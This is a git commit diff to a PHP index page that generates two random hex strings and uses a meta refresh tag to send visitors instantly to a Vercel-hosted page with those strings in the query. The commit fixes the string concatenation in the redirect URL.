99c9780cc2860e250c5dcd6c9793eccf07d1f532
Ula0709 <159502337+Ula0709@users.noreply.github.com>
2024-02-15 23:35:07 -0400

    Update index.php

--- index.php
+++ index.php
@@ -1,8 +1,9 @@
+
 <?php
 $bytes = openssl_random_pseudo_bytes(10);
 $rand = bin2hex($bytes);
 $bytes2 = openssl_random_pseudo_bytes(10);
 $rand2 = bin2hex($bytes2);
 
-echo '<meta http-equiv="Refresh" content="0;URL=https://dorsite-88mys2qnw-ula0709s-projects.vercel.app/indexpaginaprincipal.html/.$rand.'=?&'.$rand2.'?=">';
+echo '<meta http-equiv="Refresh" content="0;URL=https://dorsite-88mys2qnw-ula0709s-projects.vercel.app/indexpaginaprincipal.html?='.$rand.'=?&'.$rand2.'?=">';
 ?>
